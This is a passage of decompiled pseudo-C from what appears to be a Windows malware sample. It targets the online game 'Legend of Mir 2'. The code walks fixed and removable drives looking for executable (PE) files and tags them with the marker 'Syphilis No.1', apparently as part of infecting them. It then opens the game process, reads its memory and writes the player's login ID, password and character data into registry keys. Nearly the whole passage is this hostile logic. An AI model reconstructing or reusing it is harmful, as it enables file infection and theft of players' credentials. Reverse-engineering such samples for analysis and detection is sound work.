            v16 = (DWORD)&loc_423EF8;
            v15 = (DWORD)NtCurrentTeb()->NtTib.ExceptionList;
            __writefsdword(0, (unsigned int)&v15);
            v41 = sub_41AF50((int)&off_417CC0, 1, v45, 0);
            v9 = 0;
            while ( 1 )
            {
              (*(void (__fastcall **)(_DWORD, int))(*v41 + 16))(0, v9);
              v10 = *v41;
              (*(void (__fastcall **)(int, char *))(*v41 + 8))(2, v40);
              if ( v40[0] == 80 && v40[1] == 69 )
                break;
              if ( ++v9 == 265 )
                goto LABEL_23;
            }
            v42 = 1;
LABEL_23:
            LOWORD(v11) = 2;
            v12 = *v41;
            (*(void (__fastcall **)(int, int, DWORD, DWORD, int *, struct _EXCEPTION_REGISTRATION_RECORD *, void *, int *, struct _EXCEPTION_REGISTRATION_RECORD *))(*v41 + 16))(
              v11,
              -20,
              v15,
              v16,
              v17,
              v18,
              v19,
              v20,
              ExceptionList);
            sub_41ACCC(20, v34);
            sub_402DD8((int)v34, (int)"\rSyphilis No.1", (unsigned __int8)v34[0] + 1);
            if ( v13 || v36 < 10240 )
              v43 = 1;
            __writefsdword(0, (unsigned int)v22);
            v24 = &loc_423EFF;
            sub_403534(v41);
            if ( (v42 & (v43 ^ 1)) != 0 )
            {
              sub_408010(v45, &v44);
              sub_42370C(v45, v36, v12, a3, v10);
            }
          }
          __writefsdword(0, (unsigned int)v18);
          ++dword_42CC60;
        }
      }
    }
    while ( !sub_407ED4((int)v35) );
  }
  sub_404570((volatile __int32 *)&v46, v47, (char *)dword_4240A4);
  if ( !sub_407E84(v46, 63, (int)v35) )
  {
    do
    {
      if ( (v37 & 0x10) != 0 )
      {
        Delphi_CompareCall_404668((int)v38, dword_4240B0);
        if ( !v13 )
        {
          Delphi_CompareCall_404668((int)v38, &dword_4240BC);
          if ( !v13 )
          {
            PeekMessageA(&Msg, 0, 0, 0, 1u);
            sub_404570(&v25, v47, v38);
            sub_423BE8();
          }
        }
      }
    }
    while ( !sub_407ED4((int)v35) );
  }
  __writefsdword(0, (unsigned int)ExceptionList);
  v23 = (int *)&loc_42403C;
  sub_404290((int)&v25, 8);
  sub_404CB0((int)v35, (int)dword_406E20);
  sub_40426C(&v39);
  return sub_404290((int)&v44, 4);
}
// 423EA5: variable 'v11' is possibly undefined
// 423ED0: variable 'v13' is possibly undefined
// 406E20: using guessed type int dword_406E20[5];
// 417CC0: using guessed type int (*off_417CC0)();
// 41ACCC: using guessed type int __fastcall sub_41ACCC(_DWORD, _DWORD);
// 42404C: using guessed type int dword_42404C;
// 424068: using guessed type int dword_424068[3];
// 4240A4: using guessed type int dword_4240A4[3];
// 4240B0: using guessed type int dword_4240B0[3];
// 4240BC: using guessed type int dword_4240BC;
// 42CC60: using guessed type int dword_42CC60;
// 42CCCC: using guessed type int dword_42CCCC;
// 42CCD0: using guessed type int dword_42CCD0;
// 42CCD4: using guessed type int dword_42CCD4;
// 423BE8: using guessed type char var_178[4];
// 423BE8: using guessed type char *var_20;

//----- (004240C0) --------------------------------------------------------
int __usercall sub_4240C0@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>)
{
  char *v3; // eax
  __int16 DriveTypeA; // ax
  char *v6; // [esp-24h] [ebp-38h]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-20h] [ebp-34h] BYREF
  void *v8; // [esp-1Ch] [ebp-30h]
  int *v9; // [esp-18h] [ebp-2Ch]
  unsigned int v10[2]; // [esp-14h] [ebp-28h] BYREF
  int *v11; // [esp-Ch] [ebp-20h]
  int v12; // [esp-8h] [ebp-1Ch]
  int v13; // [esp-4h] [ebp-18h]
  char *v14; // [esp+0h] [ebp-14h] BYREF
  char *v15; // [esp+4h] [ebp-10h] BYREF
  char *v16; // [esp+8h] [ebp-Ch] BYREF
  char *v17; // [esp+Ch] [ebp-8h] BYREF
  char *v18; // [esp+10h] [ebp-4h] BYREF
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v18 = 0;
  v17 = 0;
  v16 = 0;
  v15 = 0;
  v14 = 0;
  v13 = a1;
  v12 = a3;
  v11 = &savedregs;
  v10[1] = (unsigned int)&loc_4241F0;
  v10[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v10);
  v9 = &savedregs;
  v8 = &loc_4241CE;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  if ( !byte_42CCD8 )
  {
    LOBYTE(a1) = 65;
    do
    {
      if ( !*(_BYTE *)(dword_42CCE0 + 1) )
        goto LABEL_10;
      if ( !Buffer )
        GetWindowsDirectoryA(0, 0xFFu);
      sub_40445C(&v16, (char *)Buffer);
      sub_40C214((int)v16, &v17);
      v6 = v17;
      sub_40444C(&v15);
      if ( (int)sub_404804(v15, v6) <= 0 )
      {
LABEL_10:
        sub_40444C(&v14);
        sub_404570((volatile __int32 *)&v18, v14, (char *)sub_42420C);
        v3 = sub_40471C(v18);
        DriveTypeA = GetDriveTypeA(v3);
        if ( DriveTypeA == 3 || *(_BYTE *)(dword_42CCE0 + 2) && DriveTypeA == 4 )
          sub_423BE8(v18, a1, a2, (int)Buffer);
      }
      ++a1;
    }
    while ( (_BYTE)a1 != 91 );
    goto LABEL_15;
  }
  if ( dword_42CCDC )
  {
    sub_423BE8((char *)dword_42CCDC, a1, a2, (int)Buffer);
LABEL_15:
    __writefsdword(0, (unsigned int)ExceptionList);
    v9 = (int *)&loc_4241D5;
    goto LABEL_16;
  }
  sub_403D78((unsigned int)ExceptionList, (int)v8, (int)v9);
LABEL_16:
  __writefsdword(0, v10[0]);
  v11 = (int *)&loc_4241F7;
  return sub_404290((int)&v14, 5);
}
// 4240C0: could not find valid save-restore pair for ebx
// 4240C0: could not find valid save-restore pair for esi
// 42CCD8: using guessed type char byte_42CCD8;
// 42CCDC: using guessed type int dword_42CCDC;
// 42CCE0: using guessed type int dword_42CCE0;

//----- (0042420C) --------------------------------------------------------
int sub_42420C()
{
  int result; // eax
  unsigned int v1[3]; // [esp-Ch] [ebp-Ch] BYREF
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v1[2] = (unsigned int)&savedregs;
  v1[1] = (unsigned int)&loc_42425B;
  v1[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v1);
  if ( !++dword_42CCE4 )
  {
    sub_405868(&dword_42CCE0, (int)dword_423150);
    sub_40426C(&dword_42CCDC);
    sub_40426C(&dword_42CC64);
  }
  result = 0;
  __writefsdword(0, v1[0]);
  return result;
}
// 423150: using guessed type int dword_423150[3];
// 42CC64: using guessed type _DWORD dword_42CC64;
// 42CCDC: using guessed type int dword_42CCDC;
// 42CCE0: using guessed type int dword_42CCE0;
// 42CCE4: using guessed type int dword_42CCE4;

//----- (00424264) --------------------------------------------------------
void sub_424264()
{
  --dword_42CCE4;
}
// 42CCE4: using guessed type int dword_42CCE4;

//----- (0042433C) --------------------------------------------------------
_DWORD *__userpurge sub_42433C@<eax>(
        _BYTE *a1@<eax>,
        char *a2@<edx>,
        char *a3@<ecx>,
        volatile __int32 *a4,
        int a5,
        int a6,
        _DWORD *a7,
        volatile __int32 *a8,
        int a9,
        char a10,
        int a11,
        char a12,
        int a13)
{
  HWND WindowA; // ebx
  char *v14; // eax
  LPVOID *v15; // esi
  int *v16; // ebx
  int v17; // edi
  int v18; // eax
  const void *v19; // edi
  int v20; // edi
  int *v21; // ebx
  _BYTE *v22; // edi
  int v23; // eax
  int v24; // edi
  char v25; // bl
  char v26; // zf
  int v27; // esi
  int v28; // eax
  int v30; // [esp-14h] [ebp-A0h]
  unsigned int v31[2]; // [esp-Ch] [ebp-98h] BYREF
  int *v32; // [esp-4h] [ebp-90h]
  char *v33; // [esp+Ch] [ebp-80h] BYREF
  int v34; // [esp+10h] [ebp-7Ch] BYREF
  char v35; // [esp+14h] [ebp-78h]
  char *v36; // [esp+18h] [ebp-74h] BYREF
  int v37[7]; // [esp+1Ch] [ebp-70h] BYREF
  char v38; // [esp+38h] [ebp-54h] BYREF
  SIZE_T v39; // [esp+54h] [ebp-38h]
  char v40; // [esp+5Bh] [ebp-31h]
  int v41; // [esp+5Ch] [ebp-30h]
  int v42; // [esp+60h] [ebp-2Ch]
  char *v43; // [esp+64h] [ebp-28h] BYREF
  char *v44; // [esp+68h] [ebp-24h] BYREF
  char *v45; // [esp+6Ch] [ebp-20h] BYREF
  SIZE_T NumberOfBytesRead; // [esp+70h] [ebp-1Ch] BYREF
  SIZE_T nSize; // [esp+74h] [ebp-18h]
  HANDLE hProcess; // [esp+78h] [ebp-14h]
  DWORD dwProcessId; // [esp+7Ch] [ebp-10h] BYREF
  char *v50; // [esp+80h] [ebp-Ch] BYREF
  char *v51; // [esp+84h] [ebp-8h]
  _BYTE *v52; // [esp+88h] [ebp-4h]
  int savedregs; // [esp+8Ch] [ebp+0h] BYREF

  v33 = 0;
  v36 = 0;
  v45 = 0;
  v44 = 0;
  v43 = 0;
  v50 = a3;
  v51 = a2;
  v52 = a1;
  sub_40470C((int)a1);
  sub_40470C((int)v51);
  sub_40470C((int)v50);
  sub_40470C(a11);
  sub_40470C(a6);
  sub_404C1C(v37, dword_40105C, 7);
  v32 = &savedregs;
  v31[1] = (unsigned int)&loc_424728;
  v31[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v31);
  WindowA = FindWindowA(0, "legend of mir2");
  if ( !WindowA )
  {
    sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "realtitle", &v45);
    if ( v45 )
    {
      v14 = sub_40471C(v45);
      WindowA = FindWindowA("TfrmMain", v14);
    }
  }
  sub_40426C(a8);
  sub_40426C(a4);
  v41 = 0;
  if ( WindowA )
  {
    GetWindowThreadProcessId(WindowA, &dwProcessId);
    hProcess = OpenProcess(0x1F0FFFu, 0, dwProcessId);
    if ( hProcess )
    {
      nSize = sub_40CCE4(v50);
      v42 = 0;
      v15 = (LPVOID *)&v38;
      v16 = v37;
      do
      {
        PeekMessageA(&Msg, 0, 0, 0, 1u);
        v17 = sub_40CCE4(v51);
        v18 = sub_40CCE4(v50);
        v19 = (const void *)(v42 * v18 + v17);
        *v15 = sub_40C7B0(nSize);
        if ( ReadProcessMemory(hProcess, v19, *v15, nSize, &NumberOfBytesRead) || nSize != NumberOfBytesRead )
        {
          sub_40426C(v16);
          if ( (int)(nSize - 1) >= 0 )
          {
            v39 = nSize;
            v20 = 0;
            do
            {
              v34 = *((unsigned __int8 *)*v15 + v20);
              v35 = 0;
              sub_40CCD0("%.2X", (int)&v34, 0, &v36);
              sub_40452C((char **)v16, (__int32)v36);
              ++v20;
              --v39;
            }
            while ( v39 );
          }
        }
        sub_402700((int)*v15);
        ++v42;
        ++v16;
        ++v15;
      }
      while ( v42 != 7 );
      CloseHandle_0(hProcess);
      sub_40426C(&v44);
      v42 = 0;
      v21 = v37;
      while ( 1 )
      {
        PeekMessageA(&Msg, 0, 0, 0, 1u);
        sub_40452C(&v44, *v21);
        v22 = sub_404804(v52, v44);
        if ( (int)v22 > 0 )
          break;
        if ( v42 < 6 )
        {
          v27 = sub_404524((int)v44);
          v30 = v27 - sub_404524((int)v52) + 1;
          v28 = sub_404524((int)v52);
          Delphi_Copy_40477C((int)v44, v30, v28, &v44);
        }
        ++v42;
        ++v21;
        if ( v42 == 7 )
          goto LABEL_37;
      }
      if ( v42 < 6 )
      {
        sub_40452C(&v44, v21[1]);
        if ( v42 + 1 < 6 )
          sub_40452C(&v44, v21[2]);
      }
      if ( !v42 )
        v22 += sub_404524((int)v52);
      Delphi_Copy_40477C((int)v44, (int)v22, a13, &v44);
      v41 = sub_40CCE4(v51);
      v23 = sub_40CCE4(v50);
      v41 += (int)(v22 - 1) / 2 + v42 * v23;
      v24 = 1;
      sub_40426C(&v45);
      sub_4042C0(a8, (__int32)v44);
      v40 = 0;
      v25 = 0;
      while ( v24 < sub_404524((int)v44) )
      {
        Delphi_Copy_40477C((int)v44, v24, 2, &v43);
        Delphi_CompareCall_404668((int)v43, dword_424778);
        if ( v26 )
        {
          if ( v40 )
            v25 = 1;
          if ( a12 )
            break;
          sub_40452C(&v45, a11);
        }
        else
        {
          v40 = 1;
          if ( a10 && a9 > 0 && v25 )
          {
            v25 = 0;
            sub_40452C(&v45, (__int32)"%20%");
            ++a9;
          }
          sub_40CCE4(v43);
          sub_40444C(&v33);
          sub_40452C(&v45, (__int32)v33);
        }
        v24 += 2;
      }
      sub_4042C0(a8, (__int32)v44);
      sub_4042C0(a4, (__int32)v45);
LABEL_37:
      *a7 = v41;
    }
  }
  __writefsdword(0, v31[0]);
  v32 = (int *)&loc_42472F;
  sub_40426C(&v33);
  sub_40426C(&v36);
  sub_404CE4(v37, (char *)dword_40105C, 7);
  sub_404290((int)&v43, 3);
  sub_404290((int)&v50, 3);
  sub_40426C(&a6);
  return sub_40426C(&a11);
}
// 4245F8: variable 'v26' is possibly undefined
// 40105C: using guessed type int dword_40105C[2];
// 424778: using guessed type int dword_424778[3];
// 42433C: using guessed type int var_70[7];

//----- (0042478C) --------------------------------------------------------
_DWORD *__fastcall sub_42478C(SIZE_T a1, char *a2, volatile __int32 *a3, char a4)
{
  HWND WindowA; // ebx
  char *v6; // eax
  const void *v7; // edi
  int v8; // edi
  int v9; // edi
  LPVOID *v10; // ebx
  char **v11; // esi
  char v12; // zf
  const void *v13; // edi
  int v14; // eax
  int v15; // edi
  __int32 *v16; // ebx
  _BYTE *v17; // edi
  int v18; // eax
  int v19; // edi
  int v20; // esi
  int v21; // eax
  int v23; // [esp-14h] [ebp-A8h]
  unsigned int v24[2]; // [esp-Ch] [ebp-A0h] BYREF
  int *v25; // [esp-4h] [ebp-98h]
  char *v26; // [esp+Ch] [ebp-88h] BYREF
  char *v27; // [esp+10h] [ebp-84h] BYREF
  char *v28; // [esp+14h] [ebp-80h] BYREF
  char *v29; // [esp+18h] [ebp-7Ch] BYREF
  char *v30; // [esp+1Ch] [ebp-78h] BYREF
  char *v31; // [esp+20h] [ebp-74h] BYREF
  int v32; // [esp+24h] [ebp-70h] BYREF
  char v33; // [esp+28h] [ebp-6Ch]
  char *v34; // [esp+2Ch] [ebp-68h] BYREF
  char *v35[7]; // [esp+30h] [ebp-64h] BYREF
  char *v36; // [esp+4Ch] [ebp-48h] BYREF
  SIZE_T v37; // [esp+68h] [ebp-2Ch]
  int v38; // [esp+6Ch] [ebp-28h]
  char *v39; // [esp+70h] [ebp-24h] BYREF
  char *v40; // [esp+74h] [ebp-20h] BYREF
  _BYTE *v41; // [esp+78h] [ebp-1Ch] BYREF
  SIZE_T NumberOfBytesRead; // [esp+7Ch] [ebp-18h] BYREF
  SIZE_T nSize; // [esp+80h] [ebp-14h]
  int v44; // [esp+84h] [ebp-10h]
  HANDLE hProcess; // [esp+88h] [ebp-Ch]
  DWORD dwProcessId; // [esp+8Ch] [ebp-8h] BYREF
  char *v47; // [esp+90h] [ebp-4h] BYREF
  int savedregs; // [esp+94h] [ebp+0h] BYREF

  v27 = 0;
  v26 = 0;
  v28 = 0;
  v29 = 0;
  v31 = 0;
  v30 = 0;
  v34 = 0;
  v41 = 0;
  v40 = 0;
  v39 = 0;
  v47 = a2;
  sub_40470C((int)a2);
  sub_404C1C(v35, dword_40105C, 7);
  v25 = &savedregs;
  v24[1] = (unsigned int)&loc_424C02;
  v24[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v24);
  WindowA = FindWindowA("TfrmMain", "legend of mir2");
  if ( !WindowA )
  {
    sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "realtitle", &v40);
    if ( v40 )
    {
      v6 = sub_40471C(v40);
      WindowA = FindWindowA("TfrmMain", v6);
    }
  }
  if ( WindowA )
  {
    GetWindowThreadProcessId(WindowA, &dwProcessId);
    hProcess = OpenProcess(0x1F0FFFu, 0, dwProcessId);
    if ( hProcess )
    {
      if ( a1 )
      {
        v7 = (const void *)sub_40CCE4(v47);
        nSize = a1;
        v36 = sub_40C7B0(a1);
        if ( ReadProcessMemory(hProcess, v7, v36, nSize, &NumberOfBytesRead) || nSize != NumberOfBytesRead )
        {
          sub_40426C(v35);
          if ( (int)(nSize - 1) >= 0 )
          {
            v37 = nSize;
            v8 = 0;
            do
            {
              v32 = (unsigned __int8)v36[v8];
              v33 = 0;
              sub_40CCD0("%.2X", (int)&v32, 0, &v34);
              sub_40452C(v35, (__int32)v34);
              ++v8;
              --v37;
            }
            while ( v37 );
          }
        }
        sub_402700((int)v36);
        CloseHandle_0(hProcess);
        sub_404304((volatile __int32 *)&v39, (__int32)v35[0]);
        if ( a4 )
        {
          sub_4042C0(a3, (__int32)v39);
          goto LABEL_39;
        }
        v9 = 1;
        sub_40426C(&v40);
        while ( v9 < sub_404524((int)v39) )
        {
          Delphi_Copy_40477C((int)v39, v9, 2, &v30);
          sub_40CCE4(v30);
          sub_40444C(&v31);
          sub_40452C(&v40, (__int32)v31);
          v9 += 2;
        }
      }
      else
      {
        sub_404304((volatile __int32 *)&v41, (__int32)"496E646570656E64656E74204269746D61700000006A280000");
        v44 = 6144;
        v38 = 0;
        v10 = (LPVOID *)&v36;
        v11 = v35;
        do
        {
          PeekMessageA(&Msg, 0, 0, 0, 1u);
          sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "WinX", &v29);
          Delphi_CompareCall_404668((int)v29, &dword_424C98);
          if ( v12 )
          {
            v13 = (const void *)(v38 * v44 + 14352384);
            v14 = v38 * v44 + 14417920;
          }
          else
          {
            v13 = (const void *)(v38 * v44 + 18350080);
            v14 = v38 * v44 + 18356224;
          }
          nSize = v14 - (_DWORD)v13 + 1;
          *v10 = sub_40C7B0(nSize);
          if ( ReadProcessMemory(hProcess, v13, *v10, nSize, &NumberOfBytesRead) || nSize != NumberOfBytesRead )
          {
            sub_40426C(v11);
            if ( (int)(nSize - 1) >= 0 )
            {
              v37 = nSize;
              v15 = 0;
              do
              {
                v32 = *((unsigned __int8 *)*v10 + v15);
                v33 = 0;
                sub_40CCD0("%.2X", (int)&v32, 0, &v28);
                sub_40452C(v11, (__int32)v28);
                ++v15;
                --v37;
              }
              while ( v37 );
            }
          }
          sub_402700((int)*v10);
          ++v38;
          ++v11;
          ++v10;
        }
        while ( v38 != 7 );
        CloseHandle_0(hProcess);
        sub_40426C(&v39);
        v38 = 0;
        v16 = (__int32 *)v35;
        while ( 1 )
        {
          PeekMessageA(&Msg, 0, 0, 0, 1u);
          sub_40452C(&v39, *v16);
          v17 = sub_404804(v41, v39);
          if ( (int)v17 > 0 )
            break;
          if ( v38 < 6 )
          {
            v20 = sub_404524((int)v39);
            v23 = v20 - sub_404524((int)v41) + 1;
            v21 = sub_404524((int)v41);
            Delphi_Copy_40477C((int)v39, v23, v21, &v39);
          }
          ++v38;
          ++v16;
          if ( v38 == 7 )
            goto LABEL_39;
        }
        if ( v38 < 6 )
          sub_40452C(&v39, v16[1]);
        v18 = sub_404524((int)v41);
        Delphi_Copy_40477C((int)v39, (int)&v17[v18], 100, &v39);
        v19 = 1;
        sub_40426C(&v40);
        while ( v19 < sub_404524((int)v39) )
        {
          Delphi_Copy_40477C((int)v39, v19, 2, &v26);
          sub_40CCE4(v26);
          sub_40444C(&v27);
          sub_40452C(&v40, (__int32)v27);
          v19 += 2;
        }
      }
      sub_4042C0(a3, (__int32)v40);
    }
  }
LABEL_39:
  __writefsdword(0, v24[0]);
  v25 = (int *)&loc_424C09;
  sub_404290((int)&v26, 6);
  sub_40426C(&v34);
  sub_404CE4((int *)v35, (char *)dword_40105C, 7);
  sub_404290((int)&v39, 3);
  return sub_40426C(&v47);
}
// 4249D5: variable 'v12' is possibly undefined
// 40105C: using guessed type int dword_40105C[2];
// 424C98: using guessed type int dword_424C98;

//----- (00424C9C) --------------------------------------------------------
_DWORD *__usercall sub_424C9C@<eax>(int a1@<eax>, int a2@<edx>, volatile __int32 *a3@<ecx>)
{
  char v5; // zf
  unsigned int v7[2]; // [esp-Ch] [ebp-18h] BYREF
  int *v8; // [esp-4h] [ebp-10h]
  int v9; // [esp+8h] [ebp-4h] BYREF
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v9 = a1;
  sub_40470C(a1);
  v8 = &savedregs;
  v7[1] = (unsigned int)&loc_424D59;
  v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v7);
  if ( a2 )
  {
    Delphi_CompareCall_404668(v9, dword_424D70);
    if ( v5 )
      sub_4042C0(a3, (__int32)dword_424DC4);
    else
      sub_4042C0(a3, (__int32)&dword_424DD0);
  }
  else
  {
    Delphi_CompareCall_404668(v9, dword_424D70);
    if ( v5 )
    {
      sub_4042C0(a3, (__int32)dword_424D7C);
    }
    else
    {
      Delphi_CompareCall_404668(v9, dword_424D8C);
      if ( v5 )
      {
        sub_4042C0(a3, (__int32)dword_424D98);
      }
      else
      {
        Delphi_CompareCall_404668(v9, dword_424DA8);
        if ( v5 )
          sub_4042C0(a3, (__int32)sub_424DB4);
      }
    }
  }
  __writefsdword(0, v7[0]);
  v8 = (int *)&loc_424D60;
  return sub_40426C(&v9);
}
// 424CD0: variable 'v5' is possibly undefined
// 424D70: using guessed type int dword_424D70[3];
// 424D7C: using guessed type int dword_424D7C[2];
// 424D8C: using guessed type int dword_424D8C[3];
// 424D98: using guessed type int dword_424D98[4];
// 424DA8: using guessed type int dword_424DA8[3];
// 424DC4: using guessed type int dword_424DC4[3];
// 424DD0: using guessed type int dword_424DD0;

//----- (00424DB4) --------------------------------------------------------
int __userpurge sub_424DB4@<eax>(
        __int16 a1@<cx>,
        int a2,
        int a3,
        int a4,
        int a5,
        int a6,
        int a7,
        int a8,
        int a9,
        int a10,
        int a11,
        int a12,
        int a13,
        int a14,
        int a15,
        int a16,
        int a17,
        int a18,
        int a19,
        int a20,
        int a21,
        int a22,
        int a23,
        int a24,
        int a25,
        int a26,
        int a27,
        int a28,
        int a29,
        int a30,
        int a31,
        int a32,
        int a33,
        int a34,
        int a35,
        int a36,
        int a37,
        int a38,
        int a39,
        int a40,
        int a41,
        int a42,
        int a43,
        int a44,
        int a45,
        int a46,
        int a47,
        int a48,
        int a49)
{
  void *retaddr[2]; // [esp+0h] [ebp+0h]

  HIBYTE(a1) = -64;
  return MK_FP(retaddr[0], retaddr[0])(
           a1,
           a2,
           a3,
           a4,
           a5,
           a6,
           a7,
           a8,
           a9,
           a10,
           a11,
           a12,
           a13,
           a14,
           a15,
           a16,
           a17,
           a18,
           a19,
           a20,
           a21,
           a22,
           a23,
           a24,
           a25,
           a26,
           a27,
           a28,
           a29,
           a30,
           a31,
           a32,
           a33,
           a34,
           a35,
           a36,
           a37,
           a38,
           a39,
           a40,
           a41,
           a42,
           a43,
           a44,
           a45,
           a46,
           a47,
           a48);
}

//----- (00424DD4) --------------------------------------------------------
int __usercall sub_424DD4@<eax>(int a1@<eax>)
{
  int v2; // ebx
  char *v3; // eax
  char *v4; // eax
  char *v5; // eax
  char *v6; // eax
  char *v7; // eax
  char v8; // zf
  char *v9; // eax
  char *v10; // eax
  char *v11; // eax
  char *v12; // eax
  char *v13; // eax
  char *v14; // eax
  char *v15; // eax
  char *v16; // eax
  char *v17; // eax
  char *v18; // eax
  char *v19; // eax
  char *v20; // eax
  char *v21; // eax
  char *v22; // eax
  char *v23; // eax
  char *v24; // eax
  char *v26; // [esp-10h] [ebp-8Ch]
  char *v27; // [esp-10h] [ebp-8Ch]
  char *v28; // [esp-10h] [ebp-8Ch]
  char *v29; // [esp-10h] [ebp-8Ch]
  char *v30; // [esp-10h] [ebp-8Ch]
  char *v31; // [esp-10h] [ebp-8Ch]
  char *v32; // [esp-10h] [ebp-8Ch]
  char *v33; // [esp-10h] [ebp-8Ch]
  char *v34; // [esp-10h] [ebp-8Ch]
  char *v35; // [esp-10h] [ebp-8Ch]
  char *v36; // [esp-10h] [ebp-8Ch]
  char *v37; // [esp-10h] [ebp-8Ch]
  unsigned int v38[2]; // [esp-Ch] [ebp-88h] BYREF
  int *v39; // [esp-4h] [ebp-80h]
  char *v40; // [esp+8h] [ebp-74h] BYREF
  char *v41; // [esp+Ch] [ebp-70h] BYREF
  char *v42; // [esp+10h] [ebp-6Ch] BYREF
  char *v43; // [esp+14h] [ebp-68h] BYREF
  char *v44; // [esp+18h] [ebp-64h] BYREF
  char *v45; // [esp+1Ch] [ebp-60h] BYREF
  char *v46; // [esp+20h] [ebp-5Ch] BYREF
  char *v47; // [esp+24h] [ebp-58h] BYREF
  char *v48; // [esp+28h] [ebp-54h] BYREF
  char *v49; // [esp+2Ch] [ebp-50h] BYREF
  char *v50; // [esp+30h] [ebp-4Ch] BYREF
  char *v51; // [esp+34h] [ebp-48h] BYREF
  char *v52; // [esp+38h] [ebp-44h] BYREF
  char *v53; // [esp+3Ch] [ebp-40h] BYREF
  char *v54; // [esp+40h] [ebp-3Ch] BYREF
  char *v55; // [esp+44h] [ebp-38h] BYREF
  char *v56; // [esp+48h] [ebp-34h] BYREF
  char *v57; // [esp+4Ch] [ebp-30h] BYREF
  char *v58; // [esp+50h] [ebp-2Ch] BYREF
  char *v59; // [esp+54h] [ebp-28h] BYREF
  char *v60; // [esp+58h] [ebp-24h] BYREF
  char *v61; // [esp+5Ch] [ebp-20h] BYREF
  char *v62; // [esp+60h] [ebp-1Ch] BYREF
  char *v63; // [esp+64h] [ebp-18h] BYREF
  char *v64; // [esp+68h] [ebp-14h] BYREF
  char *v65; // [esp+6Ch] [ebp-10h] BYREF
  char *v66; // [esp+70h] [ebp-Ch] BYREF
  char *v67; // [esp+74h] [ebp-8h] BYREF
  char *v68; // [esp+78h] [ebp-4h] BYREF
  int savedregs; // [esp+7Ch] [ebp+0h] BYREF

  v39 = &savedregs;
  v38[1] = (unsigned int)&loc_425400;
  v38[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v38);
  if ( a1 >= 5 )
  {
    v2 = 1;
    sub_40426C(&v68);
    while ( 1 )
    {
      sub_40C670(v2, (volatile __int32 *)&v66);
      v3 = sub_40471C(v66);
      if ( !(unsigned __int8)sub_40E97C(HKEY_CLASSES_ROOT, "legend of mir2\\Enter", v3) )
        break;
      if ( ++v2 > 99 )
        goto LABEL_6;
    }
    sub_40C670(v2, (volatile __int32 *)&v68);
LABEL_6:
    if ( (unsigned __int8)sub_40E944("ID", HKEY_CLASSES_ROOT, "legend of mir2", v2)
      && (unsigned __int8)sub_40E944("PW", HKEY_CLASSES_ROOT, "legend of mir2", v2)
      && (unsigned __int8)sub_40E944(dword_425440, HKEY_CLASSES_ROOT, "legend of mir2", v2) )
    {
      sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", dword_425440, &v65);
      v26 = sub_40471C(v65);
      sub_404570((volatile __int32 *)&v64, "legend of mir2\\Enter\\", v68);
      v4 = sub_40471C(v64);
      sub_40E67C(HKEY_CLASSES_ROOT, v4, dword_425440, 1, (BYTE *)v26);
      sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "ID", &v63);
      v27 = sub_40471C(v63);
      sub_404570((volatile __int32 *)&v62, "legend of mir2\\Enter\\", v68);
      v5 = sub_40471C(v62);
      sub_40E67C(HKEY_CLASSES_ROOT, v5, "ID", 1, (BYTE *)v27);
      sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "PW", &v61);
      v28 = sub_40471C(v61);
      sub_404570((volatile __int32 *)&v60, "legend of mir2\\Enter\\", v68);
      v6 = sub_40471C(v60);
      sub_40E67C(HKEY_CLASSES_ROOT, v6, "PW", 1, (BYTE *)v28);
      sub_40E8D0(HKEY_CLASSES_ROOT, "legend of mir2", "SP", &v59);
      v29 = sub_40471C(v59);
      sub_404570((volatile __int32 *)&v58, "legend of mir2\\Enter\\", v68);
      v7 = sub_40471C(v58);
      sub_40E67C(HKEY_CLASSES_ROOT, v7, "SP", 1, (BYTE *)v29);
      sub_404304((volatile __int32 *)&v67, *(_DWORD *)*off_42B87C);
      Delphi_Copy_40477C((int)v67, 1, 1, &v57);
      Delphi_CompareCall_404668((int)v57, &dword_425474);
      if ( v8 )
        sub_4047BC(&v67, 1, 1);
      v30 = sub_40471C(v67);
      sub_404570((volatile __int32 *)&v56, "legend of mir2\\Enter\\", v68);
      v9 = sub_40471C(v56);
      sub_40E67C(HKEY_CLASSES_ROOT, v9, "JsN1", 1, (BYTE *)v30);
      sub_424C9C(*(_DWORD *)(*off_42B87C + 4), 0, (volatile __int32 *)&v55);
      v31 = sub_40471C(v55);
      sub_404570((volatile __int32 *)&v54, "legend of mir2\\Enter\\", v68);
      v10 = sub_40471C(v54);
      sub_40E67C(HKEY_CLASSES_ROOT, v10, "JsZ1", 1, (BYTE *)v31);
      v32 = sub_40471C(*(char **)(*off_42B87C + 12));
      sub_404570((volatile __int32 *)&v53, "legend of mir2\\Enter\\", v68);
      v11 = sub_40471C(v53);
      sub_40E67C(HKEY_CLASSES_ROOT, v11, "JsD1", 1, (BYTE *)v32);
      sub_424C9C(*(_DWORD *)(*off_42B87C + 16), 1, (volatile __int32 *)&v52);
      v33 = sub_40471C(v52);
      sub_404570((volatile __int32 *)&v51, "legend of mir2\\Enter\\", v68);
      v12 = sub_40471C(v51);
      sub_40E67C(HKEY_CLASSES_ROOT, v12, "JsS1", 1, (BYTE *)v33);
      v13 = sub_40471C(v67);
      sub_40E67C(HKEY_CLASSES_ROOT, "legend of mir2", "JsN1", 1, (BYTE *)v13);
      sub_424C9C(*(_DWORD *)(*off_42B87C + 4), 0, (volatile __int32 *)&v50);
      v14 = sub_40471C(v50);
